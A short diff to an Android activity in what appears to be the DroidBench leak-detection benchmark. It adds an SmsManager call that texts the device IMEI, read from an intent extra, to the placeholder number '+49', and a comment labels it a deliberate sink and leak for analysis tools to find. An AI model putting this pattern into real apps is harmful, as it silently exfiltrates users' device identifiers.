@@ -1,9 +1,9 @@
 package edu.mit.icc_unresolvable_intent;
 
-import edu.mit.icc_unresolvable_intent.R;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.util.Log;
 
 public class InFlowActivity extends Activity {
@@ -16,6 +16,8 @@ public class InFlowActivity extends Activity {
 		Intent i = getIntent();
 		String imei = i.getStringExtra("DroidBench");
 		Log.i("DroidBench", imei);
+		SmsManager sms = SmsManager.getDefault();
+		sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
 	}
 
 }
